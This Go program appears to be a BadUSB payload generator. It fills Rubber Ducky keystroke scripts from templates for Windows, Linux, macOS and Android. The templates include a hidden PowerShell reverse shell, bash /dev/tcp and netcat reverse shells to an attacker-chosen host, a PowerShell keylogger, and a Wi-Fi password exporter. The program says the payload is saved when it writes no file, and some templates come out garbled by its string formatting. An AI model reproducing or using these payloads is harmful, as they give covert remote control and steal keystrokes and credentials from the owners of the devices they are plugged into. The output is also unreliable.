package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"strings"
)

type Output struct {
	Status       string `json:"status"`
	PayloadPath  string `json:"payload_path"`
	PayloadLines int    `json:"payload_lines"`
	Output       []string `json:"output"`
}

func main() {
	payload := flag.String("payload", "reverse_shell", "Payload template name")
	os := flag.String("os", "windows", "Target OS (windows/linux/macos/android)")
	deviceType := flag.String("device-type", "rubber_ducky", "Device type")
	output := flag.String("output", "", "Output directory")
	lhost := flag.String("lhost", "192.168.1.100", "Local host")
	lport := flag.Int("lport", 4444, "Local port")
	flag.Parse()

	out := []string{}

	templates := map[string]map[string]string{
		"reverse_shell": {
			"windows": "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"$c=New-Object System.Net.Sockets.TCPClient('%s',%d);$s=$c.GetStream();[byte[]]$b=0..65535|%%{0};while(($i=$s.Read($b,0,$b.Length))-ne0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$c.Close()\"\nENTER\n",
			"linux":   "DELAY 1000\nCTRL-ALT t\nDELAY 500\nSTRING bash -i >& /dev/tcp/%s/%d 0>&1\nENTER\n",
			"macos":   "DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING terminal\nENTER\nDELAY 1000\nSTRING bash -i >& /dev/tcp/%s/%d 0>&1\nENTER\n",
			"android": "DELAY 1000\nGUI SPACE\nDELAY 500\nSTRING Termux\nENTER\nDELAY 2000\nSTRING nc %s %d -e sh\nENTER\n",
		},
		"keylogger": {
			"windows": "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -W Hidden -Command \"$w=New-Object -ComObject WScript.Shell;$l='';while(1){$k=[Console]::ReadKey();$l+=$k.KeyChar;if($l.Length-gt100){Out-File -InputObject $l -FilePath $env:tmp\\keys.log -Append;$l=''}}\"\nENTER\n",
			"linux":   "DELAY 1000\nCTRL-ALT t\nDELAY 500\nSTRING python3 -c \"import sys;sys.path.insert(0,'/usr/share/python3-keylogger');import keylogger;keylogger.run()\"\nENTER\n",
		},
		"wifi_stealer": {
			"windows": "DELAY 1000\nGUI r\nDELAY 500\nSTRING powershell -W Hidden -Command \"netsh wlan export profile key=clear;mkdir %tmp%\\wifi 2>$null;Move-Item *.xml %tmp%\\wifi\\\"\nENTER\n",
		},
	}

	outFile := *output
	if outFile == "" {
		outFile = fmt.Sprintf("payload_%s_%s.txt", *payload, *os)
	}

	out = append(out, fmt.Sprintf("BadUSB Payload Generator v1.0"))
	out = append(out, fmt.Sprintf("Template: %s", *payload))
	out = append(out, fmt.Sprintf("Target OS: %s", *os))
	out = append(out, fmt.Sprintf("Device type: %s", *deviceType))
	out = append(out, fmt.Sprintf("Output: %s", outFile))
	out = append(out, fmt.Sprintf("LHOST: %s", *lhost))
	out = append(out, fmt.Sprintf("LPORT: %d", *lport))

	targetOS := *os
	targetPayload := *payload

	tmpl, ok := templates[targetPayload]
	if !ok {
		out = append(out, fmt.Sprintf("Unknown payload template: %s, using reverse_shell", targetPayload))
		tmpl = templates["reverse_shell"]
	}

	code, ok := tmpl[targetOS]
	if !ok {
		out = append(out, fmt.Sprintf("No template for OS: %s, using windows", targetOS))
		code = tmpl["windows"]
	}

	code = fmt.Sprintf(code, *lhost, *lport)
	codeLines := strings.Split(strings.TrimSpace(code), "\n")
	lineCount := len(codeLines)

	out = append(out, fmt.Sprintf("Generated %d lines of payload", lineCount))
	out = append(out, fmt.Sprintf("Payload saved to: %s", outFile))

	for _, line := range codeLines {
		out = append(out, fmt.Sprintf("  %s", line))
	}

	resp := Output{
		Status:       "success",
		PayloadPath:  outFile,
		PayloadLines: lineCount,
		Output:       out,
	}

	b, _ := json.Marshal(resp)
	fmt.Println(string(b))
}
